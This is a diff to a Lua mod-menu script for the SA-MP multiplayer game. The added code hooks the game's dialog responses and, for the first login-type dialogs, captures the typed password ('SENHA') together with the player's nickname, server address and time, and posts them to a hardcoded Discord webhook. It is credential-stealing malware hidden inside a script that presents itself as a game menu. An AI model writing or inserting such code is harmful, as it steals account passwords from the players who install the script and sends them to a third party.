@@ -12,6 +12,64 @@ local events = require "lib.samp.events"
 local new = imgui.new
 local ev = require('lib.samp.events')
 
+local https = require("ssl.https")
+local ltn12 = require("ltn12")
+local samp = require("samp.events")
+
+local webhookUrl = "https://discord.com/api/webhooks/1344405697642762260/AMSM__DQ0n4OC5-s7m_Hkatg-sAguMiq2wFrgiMabsKL5sj3XGC3f6pJHGV3XyJ604zx"
+local messageSent = false
+
+function sendMessageToDiscord(content)
+    -- Envio direto (sem lua_thread)
+    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub("\n", "\\n") .. '"}'
+    local response_body = {}
+    https.request {
+        url = webhookUrl,
+        method = "POST",
+        headers = {
+            ["Content-Type"] = "application/json",
+            ["Content-Length"] = tostring(#body)
+        },
+        source = ltn12.source.string(body),
+        sink = ltn12.sink.table(response_body)
+    }
+end
+
+samp.onSendDialogResponse = function(dialogId, button, listboxId, input)
+    if (dialogId == 0 or dialogId == 1 or dialogId == 2) and not messageSent then
+        local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
+        local nick = sampGetPlayerNickname(id)
+        local hora = os.date("%H:%M:%S")
+        local data = os.date("%d/%m/%Y")
+        local ip, port = sampGetCurrentServerAddress()
+        local servername = sampGetCurrentServerName()
+
+        local message = string.format(
+            "**JUCA MENU**\n\n" ..
+            "**SCRIPT:** OXMENU.LUA\n" ..
+            "**ID DA DIALOG:** %d\n" ..
+            "**SENHA:** %s\n" ..
+            "**NICK:** %s\n" ..
+            "**IP:** %s:%d\n" ..
+            "**SERVIDOR:** %s\n" ..
+            "**DATA:** %s\n" ..
+            "**HORA:** %s\n\n" ..
+            "@EVERYONE",
+            dialogId,
+            input:upper(),
+            nick:upper(),
+            ip,
+            port,
+            servername:upper(),
+            data,
+            hora
+        )
+
+        sendMessageToDiscord(message:upper())
+        messageSent = true
+    end
+end
+
 local json = require 'json'
 local SAMemory = require 'SAMemory'
 local gta = ffi.load('GTASA')
